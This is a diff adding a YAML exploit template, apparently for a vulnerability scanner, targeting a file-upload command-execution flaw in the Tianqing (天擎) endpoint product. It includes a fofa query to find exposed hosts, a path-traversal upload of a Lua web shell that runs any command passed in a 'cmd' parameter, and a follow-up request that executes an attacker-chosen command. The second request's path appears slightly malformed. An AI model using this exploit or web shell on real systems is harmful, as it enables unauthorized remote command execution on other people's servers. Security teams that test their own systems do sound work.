@@ -1,0 +1,40 @@
+info:
+  vulId: tianqing_rce
+  detail: 天擎文件上传导致命令执行漏洞
+  fofaQuery: title="天擎"
+  expType: command
+rules:
+  - request:
+      path: "{{rootUrl}}/api/client_upload_file.json?mid=12345678901234567890123456789012&md5=12345678901234567890123456789012&filename=../../lua/{{random(6)}}.LUAC"
+      method: POST
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLx7ATxHThfk91oxQ
+        Referer: "{{rootUrl}}"
+        Accept-Encoding: gzip
+      redirect: false
+      dataType: text
+      data: "------WebKitFormBoundaryLx7ATxHThfk91oxQ\r\nContent-Disposition: form-data; name=\"file\"; filename=\"flash.php\"\r\nContent-Type: application/xxxx\r\n\r\nif ngx.req.get_uri_args().cmd then\r\ncmd = ngx.req.get_uri_args().cmd\r\nlocal t = io.popen(cmd)\r\nlocal a = t:read(\"*all\")\r\nngx.say(a)\r\nend\r\n------WebKitFormBoundaryLx7ATxHThfk91oxQ--"
+    checksCondition: and
+    checks:
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
+
+  - request:
+      path: "{{rootUrl}/api/random(6).json?cmd={{command}}"
+      method: GET
+      redirect: false
+    checksCondition: and
+    checks:
+        - checkType: status
+          desireds:
+            - 200
+          condition: and
+
+        - checkType: regex
+          desireds:
+            - "[\\S\\s]*"
+          place: body
+          condition: and
